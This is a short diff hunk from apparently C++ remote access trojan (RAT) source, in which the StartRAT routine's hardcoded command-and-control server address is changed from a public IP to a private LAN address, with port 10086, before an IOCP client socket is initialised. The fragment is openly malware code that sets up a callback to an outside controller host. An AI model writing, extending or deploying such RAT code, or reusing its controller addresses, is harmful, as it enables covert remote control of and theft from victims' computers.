@@ -4,7 +4,7 @@
 class RAT{
 private:
 	static void StartRAT(){
-		char szServerAddr[32] = "81.68.224.152";
+		char szServerAddr[32] = "192.168.0.111";
 		USHORT Port = 10086;
 
 		CIOCPClient::SocketInit();
